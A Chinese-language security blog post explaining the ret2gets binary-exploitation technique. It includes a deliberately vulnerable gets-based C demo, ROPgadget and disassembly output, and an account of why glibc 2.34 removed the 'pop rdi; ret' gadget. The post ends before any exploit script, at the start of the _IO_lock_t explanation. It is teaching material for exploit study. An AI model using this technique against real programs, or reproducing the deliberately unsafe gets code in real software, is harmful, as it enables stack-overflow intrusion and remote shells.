<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ret2gets的原理与利用方法 | XiDP</title><meta name="author" content="XiDP"><meta name="copyright" content="XiDP"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言​​ret2gets是一种利用glibc优化特性（高版本编译器）的漏洞利用技术，核心是通过gets函数配合printf&amp;#x2F;puts实现libc地址泄露。该技术适用于:  存在栈溢出漏洞 程序包含gets函数 ​​缺乏直接控制rdi寄存器的gadget​​（如pop rdi;..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ret2gets的原理与利用方法",
  "url": "http://example.com/2025/06/13/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/",
  "image": "http://example.com/img/Qhead.png",
  "datePublished": "2025-06-12T16:00:00.000Z",
  "dateModified": "2025-06-14T09:37:08.541Z",
  "author": [
    {
      "@type": "Person",
      "name": "XiDP",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/Qhead.png"><link rel="canonical" href="http://example.com/2025/06/13/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":5,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ret2gets的原理与利用方法',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/loading.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yu2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">XiDP</span></a><a class="nav-page-title" href="/"><span class="site-name">ret2gets的原理与利用方法</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ret2gets的原理与利用方法</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-14T09:37:08.541Z" title="更新于 2025-06-14 17:37:08">2025-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ret2%E7%B3%BB%E5%88%97/">ret2系列</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:100,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-06-14 17:37:08&quot;}" hidden></div><h3 id="前言​​"><a href="#前言​​" class="headerlink" title="前言​​"></a><strong>前言​</strong>​</h3><p>ret2gets是一种利用glibc优化特性（高版本编译器）的漏洞利用技术，核心是通过<code>gets</code>函数配合<code>printf</code>&#x2F;<code>puts</code>实现libc地址泄露。该技术适用于:</p>
<ol>
<li>存在栈溢出漏洞</li>
<li>程序包含<code>gets</code>函数</li>
<li>​<strong>​缺乏直接控制rdi寄存器的gadget​</strong>​（如<code>pop rdi; ret</code>）</li>
</ol>
<blockquote>
<p>技术原型参考: ret2gets | pwn-notes  <a target="_blank" rel="noopener" href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#sidenote-on-finding-locking-functions">ret2gets | pwn-notes</a><br>演示程序: ret2gets_demo <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1rf8JEi1sGBZdM-MxpnjMTg?pwd=xidp">https://pan.baidu.com/s/1rf8JEi1sGBZdM-MxpnjMTg?pwd=xidp</a> 提取码: xidp</p>
</blockquote>
<h3 id="程序中-pop-rdi-ret-的来源"><a href="#程序中-pop-rdi-ret-的来源" class="headerlink" title="程序中 pop rdi; ret 的来源"></a><strong>程序中 pop rdi; ret 的来源</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc demo.c -o demo -no-pie -fno-stack-protector</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;ROP me if you can!&quot;</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们正常会采用的方法很简单就是 <code>ret2libc</code><br>我们会利用gets的溢出，使用程序的里面的gadget来构造 <code>puts(func_got_addr)</code> 来泄露某一函数在的libc地址从而获取libc基地址，再控制程序返回，再来一次溢出使用gadget构造 <code>system(&#39;/bin/sh&#39;)</code> 以此来获得远程的shell</p>
<p>但是对于这个程序编译之后我们会遇到一个问题，下面我们使用ROPgadget来查看一下我们可用的gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary demo</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x00000000004010ab</span> : add bh, bh ; loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401037</span> : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x000000000040115f</span> : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line"><span class="number">0x0000000000401078</span> : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x0000000000401160</span> : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line"><span class="number">0x000000000040111a</span> : add byte ptr [rax], al ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401039</span> : add byte ptr [rax], al ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401161</span> : add byte ptr [rax], al ; leave ; ret</span><br><span class="line"><span class="number">0x000000000040107a</span> : add byte ptr [rax], al ; nop dword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x0000000000401034</span> : add byte ptr [rax], al ; push <span class="number">0</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401044</span> : add byte ptr [rax], al ; push <span class="number">1</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401009</span> : add byte ptr [rax], al ; test rax, rax ; je <span class="number">0x401012</span> ; call rax</span><br><span class="line"><span class="number">0x000000000040111b</span> : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000401162</span> : add cl, cl ; ret</span><br><span class="line"><span class="number">0x00000000004010aa</span> : add dil, dil ; loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401047</span> : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x000000000040111c</span> : add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401117</span> : add eax, <span class="number">0x2f03</span> ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401118</span> : add ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401013</span> : add esp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401012</span> : add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x00000000004010a8</span> : and byte ptr [rax + <span class="number">0x40</span>], al ; add bh, bh ; loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401010</span> : call rax</span><br><span class="line"><span class="number">0x0000000000401133</span> : cli ; jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x0000000000401130</span> : endbr64 ; jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x000000000040100e</span> : je <span class="number">0x401012</span> ; call rax</span><br><span class="line"><span class="number">0x00000000004010a5</span> : je <span class="number">0x4010b0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x00000000004010e7</span> : je <span class="number">0x4010f0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x000000000040103b</span> : jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401134</span> : jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x00000000004010ac</span> : jmp rax</span><br><span class="line"><span class="number">0x0000000000401163</span> : leave ; ret</span><br><span class="line"><span class="number">0x00000000004010ad</span> : loopne <span class="number">0x401115</span> ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000401116</span> : mov byte ptr [rip + <span class="number">0x2f03</span>], <span class="number">1</span> ; pop rbp ; ret</span><br><span class="line"><span class="number">0x000000000040115e</span> : mov eax, <span class="number">0</span> ; leave ; ret</span><br><span class="line"><span class="number">0x00000000004010a7</span> : mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x00000000004010af</span> : nop ; ret</span><br><span class="line"><span class="number">0x000000000040112c</span> : nop dword ptr [rax] ; endbr64 ; jmp <span class="number">0x4010c0</span></span><br><span class="line"><span class="number">0x000000000040107c</span> : nop dword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x00000000004010a6</span> : or dword ptr [rdi + <span class="number">0x404020</span>], edi ; jmp rax</span><br><span class="line"><span class="number">0x000000000040111d</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000401036</span> : push <span class="number">0</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401046</span> : push <span class="number">1</span> ; jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401016</span> : ret</span><br><span class="line"><span class="number">0x0000000000401042</span> : ret <span class="number">0x2f</span></span><br><span class="line"><span class="number">0x0000000000401022</span> : retf <span class="number">0x2f</span></span><br><span class="line"><span class="number">0x000000000040100d</span> : sal byte ptr [rdx + rax - <span class="number">1</span>], <span class="number">0xd0</span> ; add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401169</span> : sub esp, <span class="number">8</span> ; add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x0000000000401168</span> : sub rsp, <span class="number">8</span> ; add rsp, <span class="number">8</span> ; ret</span><br><span class="line"><span class="number">0x000000000040100c</span> : test eax, eax ; je <span class="number">0x401012</span> ; call rax</span><br><span class="line"><span class="number">0x00000000004010a3</span> : test eax, eax ; je <span class="number">0x4010b0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x00000000004010e5</span> : test eax, eax ; je <span class="number">0x4010f0</span> ; mov edi, <span class="number">0x404020</span> ; jmp rax</span><br><span class="line"><span class="number">0x000000000040100b</span> : test rax, rax ; je <span class="number">0x401012</span> ; call rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">53</span></span><br></pre></td></tr></table></figure>

<p>在以往我们想要构造函数调用，不论是 <code>puts(func_got_addr)</code> 还是  <code>system(&#39;/bin/sh&#39;)</code> 我们首先需要的一点就是控制 <code>rdi寄存器</code><br>而我们往往是使用 <code>pop rdi;ret</code> 这个gadget来控制rdi寄存器的，但是显然，上面的程序是没有的<br>如果我们再仔细观察我们会发现其实下面这三个我们常用的gadget都没有了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret</span><br><span class="line">pop rsi; pop r15; ret</span><br><span class="line">pop rbp; pop r12; pop r13; pop r14; ret</span><br></pre></td></tr></table></figure>

<p>这是由于程序中的 <code>pop rdi ;ret</code> 它大概的位置在 <code>&lt;__libc_csu_init+99&gt;: pop rdi</code><br>也就是说它存在于 <code>__libc_csu_init</code> 这个函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_init 的汇编</span><br><span class="line">   <span class="number">0x0000000000400670</span> &lt;+<span class="number">0</span>&gt;:	push   r15</span><br><span class="line">   <span class="number">0x0000000000400672</span> &lt;+<span class="number">2</span>&gt;:	push   r14</span><br><span class="line">   <span class="number">0x0000000000400674</span> &lt;+<span class="number">4</span>&gt;:	mov    r15d,edi</span><br><span class="line">   <span class="number">0x0000000000400677</span> &lt;+<span class="number">7</span>&gt;:	push   r13</span><br><span class="line">   <span class="number">0x0000000000400679</span> &lt;+<span class="number">9</span>&gt;:	push   r12</span><br><span class="line">   <span class="number">0x000000000040067b</span> &lt;+<span class="number">11</span>&gt;:	lea    r12,[rip+<span class="number">0x20078e</span>]        # <span class="number">0x600e10</span></span><br><span class="line">   <span class="number">0x0000000000400682</span> &lt;+<span class="number">18</span>&gt;:	push   rbp</span><br><span class="line">   <span class="number">0x0000000000400683</span> &lt;+<span class="number">19</span>&gt;:	lea    rbp,[rip+<span class="number">0x20078e</span>]        # <span class="number">0x600e18</span></span><br><span class="line">   <span class="number">0x000000000040068a</span> &lt;+<span class="number">26</span>&gt;:	push   rbx</span><br><span class="line">   <span class="number">0x000000000040068b</span> &lt;+<span class="number">27</span>&gt;:	mov    r14,rsi</span><br><span class="line">   <span class="number">0x000000000040068e</span> &lt;+<span class="number">30</span>&gt;:	mov    r13,rdx</span><br><span class="line">   <span class="number">0x0000000000400691</span> &lt;+<span class="number">33</span>&gt;:	sub    rbp,r12</span><br><span class="line">   <span class="number">0x0000000000400694</span> &lt;+<span class="number">36</span>&gt;:	sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000400698</span> &lt;+<span class="number">40</span>&gt;:	sar    rbp,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x000000000040069c</span> &lt;+<span class="number">44</span>&gt;:	call   <span class="number">0x4004b0</span> &lt;_init&gt;</span><br><span class="line">   <span class="number">0x00000000004006a1</span> &lt;+<span class="number">49</span>&gt;:	test   rbp,rbp</span><br><span class="line">   <span class="number">0x00000000004006a4</span> &lt;+<span class="number">52</span>&gt;:	je     <span class="number">0x4006c6</span> &lt;__libc_csu_init+<span class="number">86</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004006a6</span> &lt;+<span class="number">54</span>&gt;:	xor    ebx,ebx</span><br><span class="line">   <span class="number">0x00000000004006a8</span> &lt;+<span class="number">56</span>&gt;:	nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x00000000004006b0</span> &lt;+<span class="number">64</span>&gt;:	mov    rdx,r13</span><br><span class="line">   <span class="number">0x00000000004006b3</span> &lt;+<span class="number">67</span>&gt;:	mov    rsi,r14</span><br><span class="line">   <span class="number">0x00000000004006b6</span> &lt;+<span class="number">70</span>&gt;:	mov    edi,r15d</span><br><span class="line">   <span class="number">0x00000000004006b9</span> &lt;+<span class="number">73</span>&gt;:	call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">   <span class="number">0x00000000004006bd</span> &lt;+<span class="number">77</span>&gt;:	add    rbx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004006c1</span> &lt;+<span class="number">81</span>&gt;:	cmp    rbx,rbp</span><br><span class="line">   <span class="number">0x00000000004006c4</span> &lt;+<span class="number">84</span>&gt;:	jne    <span class="number">0x4006b0</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004006c6</span> &lt;+<span class="number">86</span>&gt;:	add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004006ca</span> &lt;+<span class="number">90</span>&gt;:	pop    rbx</span><br><span class="line">   <span class="number">0x00000000004006cb</span> &lt;+<span class="number">91</span>&gt;:	pop    rbp</span><br><span class="line">   <span class="number">0x00000000004006cc</span> &lt;+<span class="number">92</span>&gt;:	pop    r12</span><br><span class="line">   <span class="number">0x00000000004006ce</span> &lt;+<span class="number">94</span>&gt;:	pop    r13</span><br><span class="line">   <span class="number">0x00000000004006d0</span> &lt;+<span class="number">96</span>&gt;:	pop    r14</span><br><span class="line">   <span class="number">0x00000000004006d2</span> &lt;+<span class="number">98</span>&gt;:	pop    r15</span><br><span class="line">   <span class="number">0x00000000004006d4</span> &lt;+<span class="number">100</span>&gt;:	ret</span><br></pre></td></tr></table></figure>

<p>我们观察它的汇编代码其实不难发现，它其中并未含有 <code>pop rdi ; ret</code> 这个gadget<br>其实它来自于 <code>pop r15;</code> 的一部分</p>
<p>对比下面字节码我们就可以知道，<code>pop rdi; ret</code> 的字节码和 <code>pop r15; ret</code> 后半部分相同，所以把 <code>pop r15; ret</code> 截下来一半就是 <code>pop rdi;ret</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop r15 ; ret = <span class="number">41</span> <span class="number">5f</span> c3</span><br><span class="line">pop rdi ; ret = <span class="number">5f</span> c3</span><br></pre></td></tr></table></figure>

<p>而在glibc 2.34 中 <code>pop rdi; ret</code> 消失的根本原因是<a target="_blank" rel="noopener" href="https://sourceware.org/pipermail/libc-alpha/2021-February/122794.html">一个补丁</a>移除了 <code>__libc_csu_init</code> 的二进制生成。<br>该补丁旨在删除 <code>ret2csu</code> 的有用 ROP 小工具，并具有删除针对 glibc 2.34+ 编译的二进制文件中的 <code>pop rdi ; ret</code> 的效果。</p>
<p>这将导致一些问题，例如 <code>__libc_start_main</code>，它将 <code>__libc_csu_init</code> 作为参数。现在它不存在，它仍然接受参数，但对它没有任何作用，所以它在 2.34 中被版本优化了，因为它现在有不同的行为。这意味着我们不能够在较旧的 glibc 版本上运行为 2.34+ 编译的二进制文件，否则你会得到非常烦人的错误, 如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>: version `GLIBC_2<span class="number">.34&#x27;</span> not found</span><br></pre></td></tr></table></figure>

<p>现在我们知道在程序中由于 <code>__libc_csu_init</code> 函数被优化了，所以我们已经没办法在编译后的程序中找到 <code>pop rdi;ret</code> 了<br>但是没有关系，<code>__libc_csu_init</code> 并非是 <code>pop rdi;ret</code> 的唯一来源，显然按照我们上面的解释，哪里有 <code>pop r15</code> 那么哪里就会有 <code>pop rdi</code></p>
<p>虽然程序中没有 <code>pop rdi</code><br>但是glibc自身含大量使用r15的函数，必存<code>pop r15; ret</code>，泄露libc基址后，即可定位libc中的<code>pop rdi; ret</code>偏移</p>
<p>所以我们最大的问题还是需要溢出</p>
<h3 id="ret2gets原理和利用方法"><a href="#ret2gets原理和利用方法" class="headerlink" title="ret2gets原理和利用方法"></a><strong>ret2gets原理和利用方法</strong></h3><p>让我们来调试一下我们的demo(glibc-2.35)<br>通过下图我们可以看到，在调用 <code>gets函数</code> 之前我们的 <code>rdi寄存器</code> 是指向了栈地址<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/1.png"></p>
<p>我们使用 <code>n</code> 步过 <code>call gets</code> 然后我们就会观察发现 <code>rdi寄存器</code> 变成了 <code>_IO_stdfile_0_lock</code><br>也就是下图的 <code>*RDI  0x7ffff7e1ba80 (_IO_stdfile_0_lock) ◂— 0</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/2.png"></p>
<p>而 <code>_IO_stdfile_0_lock</code> 其实是一个’锁’，用来锁住 <code>FILE</code><br>这是因为我们的glibc是支持多线程的，因此我们需要保证线程安全，这意味着我们需要抵抗数据竞争，当多个线程可以同时使用相同的FILE结构，因此如果2个线程尝试同时使用一个FILE，这就叫竞争条件，这可能造成FILE的损坏。而我们使用锁来解决这个问题</p>
<p>而我们重点需要关注一个叫做 <code>_IO_lock_t</code> 的结构体<br>具体如下:</p>
